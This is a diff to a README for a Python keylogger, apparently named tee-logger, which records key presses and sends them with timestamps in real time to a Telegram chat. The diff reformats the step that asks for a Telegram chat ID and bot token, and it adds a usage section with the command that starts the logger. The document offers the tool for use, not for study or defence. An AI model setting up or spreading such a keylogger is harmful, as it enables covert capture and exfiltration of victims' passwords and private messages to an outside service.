@@ -31,8 +31,14 @@ This is a updated Python keylogger that logs keystrokes and sends them to a spec
 
 * 4 : Configure the Script
 
-Update the configuration variables in `Tee-logger.py`
+  - Update the configuration variables in `tee-logger.py`
 
-`CHAT_ID:` Your Telegram chat ID.
+  - `CHAT_ID:` Your Telegram chat ID.
 
-`BOT_TOKEN:` Your Telegram bot token.
+  - `BOT_TOKEN:` Your Telegram bot token.
+
+## Usage
+Run the script, and it will start sending key presses, along with timestamps in real time will be sent to the specified Telegram chat
+```bash
+python3 tee-logger.py
+```
